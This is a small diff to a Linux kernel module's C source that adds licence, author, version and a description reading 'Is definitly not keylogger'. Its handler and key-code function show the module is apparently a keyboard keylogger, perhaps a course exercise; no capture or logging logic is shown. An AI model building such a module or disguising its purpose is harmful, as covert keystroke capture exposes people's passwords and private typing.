@@ -3,6 +3,12 @@
 #include <linux/init.h>
 #include <linux/input.h>
 
+
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("281443-279460");
+MODULE_DESCRIPTION("Is definitly not keylogger");
+MODULE_VERSION("1.0");
+
 static struct input_handler keylogger_handler;
 
 static char keycode_to_char(unsigned int code) {
